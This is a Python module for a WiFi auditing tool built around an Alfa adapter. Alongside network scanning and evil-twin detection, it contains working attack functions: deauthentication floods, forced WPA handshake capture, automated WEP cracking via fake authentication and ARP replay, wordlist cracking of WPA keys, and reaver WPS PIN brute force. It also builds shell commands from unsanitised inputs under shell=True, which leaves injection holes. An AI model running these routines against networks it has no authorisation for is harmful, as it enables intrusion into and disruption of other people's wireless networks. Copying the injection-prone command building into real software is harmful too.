#!/usr/bin/env python3
"""
WiFi Module - Controls Alfa AWUS036ACS (RTL8811AU)
Monitor Mode, Packet Capture, Security Auditing & Attacks
"""

import os
import re
import time
import json
import signal
import subprocess
from datetime import datetime
from config import CAPTURES_DIR


class WiFiModule:
    """Wi-Fi scanning, monitor mode, packet capture, deauth, and attacks."""

    def __init__(self, interface='wlan1'):
        self.interface = interface
        self.monitor_interface = interface  # Same interface, iw changes the mode
        os.makedirs(CAPTURES_DIR, exist_ok=True)

    def _run(self, cmd, timeout=30):
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=timeout,
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return '', 'Command timed out', 1
        except Exception as e:
            return '', str(e), 1

    # ------------------------------------------------------------------
    # Scanning (enriched with risk and encryption details)
    # ------------------------------------------------------------------

    def scan_networks(self):
        """Scan for WiFi networks using wpa_cli on wlan1. Returns list with risk and encryption."""
        if not os.path.exists('/sys/class/net/wlan1'):
            return None

        subprocess.run(['sudo', '-n', 'ip', 'link', 'set', 'wlan1', 'up'],
                       capture_output=True)

        wpa_active = subprocess.run(
            ['systemctl', 'is-active', '--quiet', 'wpa_supplicant@wlan1']
        ).returncode == 0
        if not wpa_active:
            subprocess.run(
                ['sudo', '-n', 'systemctl', 'start', 'wpa_supplicant@wlan1'],
                capture_output=True,
            )
            time.sleep(2)

        networks = []
        try:
            for _ in range(3):
                result = subprocess.run(
                    ['sudo', '-n', 'wpa_cli', '-i', 'wlan1', 'scan'],
                    capture_output=True, text=True, timeout=5,
                )
                if 'OK' in result.stdout:
                    time.sleep(3)
                    break
                if 'FAIL-BUSY' in result.stdout:
                    time.sleep(1)
                    continue
                time.sleep(1)

            output = subprocess.check_output(
                ['sudo', '-n', 'wpa_cli', '-i', 'wlan1', 'scan_results'],
                text=True, stderr=subprocess.DEVNULL, timeout=10,
            )

            for line in output.split('\n'):
                parts = line.split('\t')
                if len(parts) < 5:
                    continue
                bssid = parts[0].strip()
                if not re.match(r'^[0-9a-fA-F:]{17}$', bssid):
                    continue

                try:
                    freq = int(parts[1].strip())
                    signal = int(parts[2].strip())
                except ValueError:
                    continue

                flags = parts[3].strip()
                ssid = parts[4].strip() if len(parts) > 4 else '(hidden)'

                encryption, risk = self._classify_security(flags)

                channel = None
                if 2412 <= freq <= 2484:
                    channel = (freq - 2412) // 5 + 1
                elif 5180 <= freq <= 5885:
                    channel = (freq - 5180) // 5 + 36

                networks.append({
                    'bssid': bssid.upper(),
                    'ssid': ssid,
                    'signal_dbm': signal,
                    'channel': channel,
                    'security': encryption,
                    'risk': risk,
                    'flags': flags,
                })
        except Exception:
            pass

        seen = {}
        for net in networks:
            ssid = net.get('ssid', '')
            if not ssid:
                continue
            if ssid not in seen or net.get('signal_dbm', -100) > seen[ssid].get('signal_dbm', -100):
                if ssid in seen and not seen[ssid].get('security') and net.get('security'):
                    seen[ssid]['security'] = net['security']
                    seen[ssid]['risk'] = net['risk']
                else:
                    seen[ssid] = net

        return sorted(seen.values(), key=lambda x: x.get('signal_dbm', -100), reverse=True)

    @staticmethod
    def _classify_security(flags):
        """Parse wpa_cli flags into (encryption_label, risk_level)."""
        flags_upper = flags.upper()
        risk = 'low'
        encryption = 'Unknown'

        # Check encryption type
        if 'WPA3' in flags_upper or 'SAE' in flags_upper:
            encryption = 'WPA3'
            risk = 'none'
        elif 'WPA2' in flags_upper:
            encryption = 'WPA2'
            risk = 'low'
        elif 'WPA-' in flags_upper or 'WPA ' in flags_upper:
            encryption = 'WPA'
            risk = 'high'
        elif 'WEP' in flags_upper:
            encryption = 'WEP'
            risk = 'critical'
        elif 'ESS' in flags_upper or not flags_upper or flags_upper == '[ESS]':
            encryption = 'OPEN'
            risk = 'critical'

        # Refine: cipher type
        if 'TKIP' in flags_upper:
            encryption += '+TKIP'
            risk = 'high' if risk != 'critical' else 'critical'
        elif 'CCMP' in flags_upper or 'AES' in flags_upper:
            encryption += '+CCMP'

        # Refine: WPS enabled
        if 'WPS' in flags_upper:
            encryption += '+WPS'
            if risk == 'low':
                risk = 'medium'

        # Hidden SSID
        if '[ESS' in flags and not flags_upper.startswith('[WPA'):
            pass  # ESS alone = open network

        return encryption, risk

    # ------------------------------------------------------------------
    # Monitor mode & packet capture
    # ------------------------------------------------------------------

    def start_monitor_mode(self):
        """
        Enter monitor mode on wlan1 using iw (no airmon-ng).
        airmon-ng check kill would kill gunicorn+hostapd -- avoided.
        """
        if not os.path.exists('/sys/class/net/wlan1'):
            return {'success': False,
                    'error': 'Alfa WiFi adapter (wlan1) not found'}

        had_connection = False
        if os.path.exists('/var/run/wpa_supplicant/wlan1'):
            had_connection = True

        # Stop WiFi client, flush, set monitor mode via iw
        subprocess.run(
            ['sudo', '-n', 'systemctl', 'stop', 'wpa_supplicant@wlan1'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'down'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'iw', 'dev', self.interface, 'set', 'type', 'monitor'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'up'],
            capture_output=True,
        )

        # Verify
        result = subprocess.run(
            ['iwconfig', self.interface],
            capture_output=True, text=True, timeout=10,
        )
        success = result.returncode == 0 and 'Mode:Monitor' in result.stdout
        self.monitor_interface = self.interface  # Use wlan1 directly

        return {'success': success,
                'interface': self.interface if success else None,
                'was_connected': had_connection}

    def stop_monitor_mode(self):
        """Return wlan1 to managed mode and restart WiFi client if needed."""
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'down'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'iw', 'dev', self.interface, 'set', 'type', 'managed'],
            capture_output=True,
        )
        subprocess.run(
            ['sudo', '-n', 'ip', 'link', 'set', self.interface, 'up'],
            capture_output=True,
        )
        # Restart wpa_supplicant to reconnect
        subprocess.run(
            ['sudo', '-n', 'systemctl', 'start', 'wpa_supplicant@wlan1'],
            capture_output=True,
        )
        return {'success': True, 'interface': self.interface}

    def _is_monitor_mode(self):
        result = subprocess.run(
            ['iwconfig', self.interface],
            capture_output=True, text=True, timeout=10,
        )
        return result.returncode == 0 and 'Mode:Monitor' in result.stdout

    # --- Filter presets for capture ---

    _FILTER_PRESETS = {
        'beacons': 'wlan type mgt subtype beacon',
        'probes': 'wlan type mgt subtype probe-req',
        'management': 'wlan type mgt',
        'data': 'wlan type data',
        'control': 'wlan type ctl',
    }

    def capture_packets(self, duration=60, channel=None, packet_filter=None):
        """
        Capture packets to pcap file with optional BPF filter.
        packet_filter: preset name ('beacons', 'probes', etc.) or raw tcpdump expression.
        """
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'capture_{timestamp}.pcap'
        filepath = os.path.join(CAPTURES_DIR, filename)

        interface = self.monitor_interface if self._is_monitor_mode() else self.interface

        cmd = f'timeout {duration} tcpdump -i {interface} -w {filepath}'
        if channel:
            cmd = f'iwconfig {interface} channel {channel} && ' + cmd

        # Apply filter
        filter_str = self._FILTER_PRESETS.get(packet_filter, packet_filter)
        if filter_str:
            cmd += f' "{filter_str}"'

        self._run(cmd)

        file_exists = os.path.exists(filepath)
        file_size = os.path.getsize(filepath) if file_exists else 0

        return {'success': file_exists, 'filename': filename, 'filepath': filepath,
                'size_bytes': file_size, 'duration': duration, 'channel': channel,
                'filter': packet_filter}

    # ------------------------------------------------------------------
    # Probe request capture (issue #13)
    # ------------------------------------------------------------------

    def capture_probes(self, duration=30):
        """Capture 802.11 probe requests using tshark. Returns list of client/SSID pairs."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        outfile = os.path.join(CAPTURES_DIR, f'probes_{timestamp}.csv')

        cmd = (
            f'timeout {duration} tshark -i {self.monitor_interface} '
            f'-Y "wlan.fc.type_subtype == 4" '
            f'-T fields -e wlan.sa -e wlan_mgt.ssid -E separator=,'
        )

        stdout, stderr, rc = self._run(cmd, timeout=duration + 10)

        probes = []
        seen = set()
        for line in stdout.strip().split('\n'):
            line = line.strip()
            if not line or ',' not in line:
                continue
            parts = line.split(',', 1)
            mac = parts[0].strip()
            ssid = parts[1].strip() if len(parts) > 1 else ''
            if mac and re.match(r'^[0-9a-fA-F:]{17}$', mac):
                key = f'{mac}:{ssid}'
                if key not in seen:
                    seen.add(key)
                    probes.append({'client_mac': mac.upper(), 'ssid': ssid,
                                   'timestamp': datetime.now().isoformat()})

        # Save raw output
        with open(outfile, 'w') as f:
            f.write(stdout)

        return {'success': True, 'probes': probes, 'count': len(probes),
                'duration': duration, 'file': outfile}

    # ------------------------------------------------------------------
    # Deauth attack (existing, now with endpoint)
    # ------------------------------------------------------------------

    def deauth_attack(self, bssid, client=None, count=5):
        """Send deauthentication frames via aireplay-ng."""
        if not self._is_monitor_mode():
            return {'success': False, 'error': 'Monitor mode required'}
        if client:
            cmd = f'aireplay-ng -0 {count} -a {bssid} -c {client} {self.monitor_interface}'
        else:
            cmd = f'aireplay-ng -0 {count} -a {bssid} {self.monitor_interface}'
        stdout, stderr, rc = self._run(cmd)
        return {'success': rc == 0, 'bssid': bssid, 'client': client,
                'frames_sent': count, 'output': stdout}

    # ------------------------------------------------------------------
    # Handshake capture (aircrack-ng)
    # ------------------------------------------------------------------

    def capture_handshake(self, bssid, channel, timeout=60):
        """Capture WPA handshake by deauth-ing a client, then waiting for reconnection."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        outfile = os.path.join('/tmp', f'handshake_{timestamp}')

        # Set channel
        self._run(f'iwconfig {self.monitor_interface} channel {channel}')

        # Start airodump-ng in background
        cmd = (
            f'timeout {timeout} airodump-ng -c {channel} '
            f'--bssid {bssid} -w {outfile} {self.monitor_interface}'
        )
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )

        time.sleep(2)
        # Send deauth to force handshake
        self._run(f'aireplay-ng -0 3 -a {bssid} {self.monitor_interface}')
        time.sleep(3)
        self._run(f'aireplay-ng -0 3 -a {bssid} {self.monitor_interface}')

        try:
            stdout, stderr = proc.communicate(timeout=timeout + 5)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()

        # Check if handshake was captured
        cap_file = f'{outfile}-01.cap'
        if os.path.exists(cap_file):
            # Verify with aircrack-ng
            check, _, _ = self._run(f'aircrack-ng {cap_file} 2>&1 | grep -c "handshake"')
            return {'success': True, 'file': cap_file, 'bssid': bssid,
                    'channel': channel, 'has_handshake': '1' in check if check else False}

        return {'success': False, 'error': 'No handshake captured',
                'bssid': bssid, 'channel': channel}

    # ------------------------------------------------------------------
    # Rogue AP detection (issue #14)
    # ------------------------------------------------------------------

    def detect_anomalies(self, networks):
        """Detect potential rogue APs and attacks from scan results."""
        if networks is None:
            return {'success': False, 'error': 'No scan data available'}

        anomalies = []

        # Group by SSID to find duplicates
        by_ssid = {}
        for net in networks:
            ssid = net.get('ssid', '')
            if not ssid or ssid == '(hidden)':
                continue
            by_ssid.setdefault(ssid, []).append(net)

        # Duplicate SSID detection (evil twin)
        for ssid, nets in by_ssid.items():
            if len(nets) > 1:
                bssids = [n['bssid'] for n in nets]
                signals = [n.get('signal_dbm', -100) for n in nets]
                anomalies.append({
                    'type': 'duplicate_ssid',
                    'severity': 'high',
                    'ssid': ssid,
                    'bssids': bssids,
                    'signals': signals,
                    'description': (
                        f'SSID "{ssid}" seen with {len(nets)} different BSSIDs '
                        f'({", ".join(bssids)}). Possible Evil Twin attack.'
                    ),
                })

        # Encryption downgrade detection
        for ssid, nets in by_ssid.items():
            encryptions = {n.get('security', '') for n in nets}
            if 'OPEN' in encryptions and any('WPA' in e for e in encryptions):
                anomalies.append({
                    'type': 'encryption_downgrade',
                    'severity': 'critical',
                    'ssid': ssid,
                    'encryptions_seen': list(encryptions),
                    'description': (
                        f'SSID "{ssid}" seen with both OPEN and encrypted modes. '
                        f'Possible active Evil Twin with encryption stripped.'
                    ),
                })

        # Suspicious signal strength
        for ssid, nets in by_ssid.items():
            for net in nets:
                if net.get('signal_dbm', -100) > -30:
                    anomalies.append({
                        'type': 'strong_signal',
                        'severity': 'medium',
                        'ssid': ssid,
                        'bssid': net['bssid'],
                        'signal_dbm': net['signal_dbm'],
                        'description': (
                            f'SSID "{ssid}" ({net["bssid"]}) has very strong signal '
                            f'({net["signal_dbm"]} dBm). Possible attacker nearby.'
                        ),
                    })

        return {'success': True, 'anomalies': anomalies, 'count': len(anomalies)}

    # ------------------------------------------------------------------
    # WEP attack (aircrack-ng)
    # ------------------------------------------------------------------

    def attack_wep(self, bssid, channel, timeout=120):
        """Automated WEP cracking using airodump-ng + aireplay-ng + aircrack-ng."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        outfile = os.path.join('/tmp', f'wep_{timestamp}')

        self._run(f'iwconfig {self.monitor_interface} channel {channel}')

        # Start capture in background
        cap_proc = subprocess.Popen(
            f'timeout {timeout} airodump-ng -c {channel} --bssid {bssid} '
            f'-w {outfile} {self.monitor_interface}',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

        time.sleep(2)
        # Fake auth and ARP replay to generate traffic
        self._run(f'aireplay-ng -1 0 -a {bssid} {self.monitor_interface}')
        self._run(f'aireplay-ng -3 -b {bssid} {self.monitor_interface}')

        try:
            cap_proc.wait(timeout=timeout + 10)
        except subprocess.TimeoutExpired:
            cap_proc.kill()

        # Try to crack
        cap_file = f'{outfile}-01.cap'
        if os.path.exists(cap_file):
            stdout, _, _ = self._run(f'aircrack-ng -a 1 {cap_file} -l /tmp/wep_key_{timestamp}.txt')
            key_file = f'/tmp/wep_key_{timestamp}.txt'
            if os.path.exists(key_file):
                with open(key_file) as f:
                    key = f.read().strip()
                key_fmt = ':'.join(key[i:i+2] for i in range(0, len(key), 2)) if ':' not in key else key
                return {'success': True, 'key': key_fmt, 'file': cap_file, 'bssid': bssid}

            # Check if key is in aircrack output
            match = re.search(r'KEY FOUND!.*?\[ ([\da-fA-F:]+) \]', stdout)
            if match:
                return {'success': True, 'key': match.group(1), 'file': cap_file, 'bssid': bssid}

        return {'success': False, 'error': 'Could not crack WEP key. Try capturing more IVs.',
                'file': cap_file, 'bssid': bssid}

    # ------------------------------------------------------------------
    # WPA handshake crack (aircrack-ng + wordlist)
    # ------------------------------------------------------------------

    def attack_wpa(self, bssid, channel, wordlist='/usr/share/wordlists/rockyou.txt',
                   timeout=90):
        """Capture WPA handshake and crack with wordlist."""
        # First, capture the handshake
        hs_result = self.capture_handshake(bssid, channel, timeout=60)
        if not hs_result.get('success') or not hs_result.get('has_handshake'):
            return {'success': False,
                    'error': hs_result.get('error', 'Failed to capture handshake'),
                    'handshake_result': hs_result}

        cap_file = hs_result['file']

        # Crack with aircrack-ng
        stdout, _, _ = self._run(
            f'aircrack-ng -w {wordlist} -b {bssid} -l /tmp/wpa_key_{os.path.basename(cap_file)}.txt {cap_file}'
        )

        key_file = f'/tmp/wpa_key_{os.path.basename(cap_file)}.txt'
        if os.path.exists(key_file):
            with open(key_file) as f:
                key = f.read().strip()
            if key:
                return {'success': True, 'key': key, 'file': cap_file, 'bssid': bssid}

        # Check aircrack output for key
        match = re.search(r'KEY FOUND!.*?\[ (.+?) \]', stdout)
        if match:
            return {'success': True, 'key': match.group(1), 'file': cap_file, 'bssid': bssid}

        return {'success': False,
                'error': 'Handshake captured but password not in wordlist.',
                'file': cap_file, 'bssid': bssid}

    # ------------------------------------------------------------------
    # WPS PIN attack (reaver)
    # ------------------------------------------------------------------

    def attack_wps(self, bssid, channel, timeout=300):
        """WPS PIN brute force using reaver."""
        if not self._is_monitor_mode():
            result = self.start_monitor_mode()
            if not result['success']:
                return {'success': False,
                        'error': f'Failed to enter monitor mode on {self.interface}'}

        self._run(f'iwconfig {self.monitor_interface} channel {channel}')

        stdout, stderr, rc = self._run(
            f'timeout {timeout} reaver -i {self.monitor_interface} '
            f'-b {bssid} -c {channel} -vv',
            timeout=timeout + 10,
        )

        # Parse reaver output for PIN and PSK
        pin_match = re.search(r'WPS PIN:\s*[\'\"]?(\d{8})[\'\"]?', stdout)
        psk_match = re.search(r'WPA PSK:\s*[\'\"]?(.+?)[\'\"]?\n', stdout)

        if pin_match:
            result = {'success': True, 'pin': pin_match.group(1), 'bssid': bssid}
            if psk_match:
                result['psk'] = psk_match.group(1)
            return result

        # Check for partial progress
        if 'WPS transaction failed' in stdout:
            return {'success': False,
                    'error': 'WPS locked or rate-limited. Try again later.', 'bssid': bssid}

        return {'success': False, 'error': 'WPS PIN not found in time window.',
                'output_tail': stdout[-500:], 'bssid': bssid}
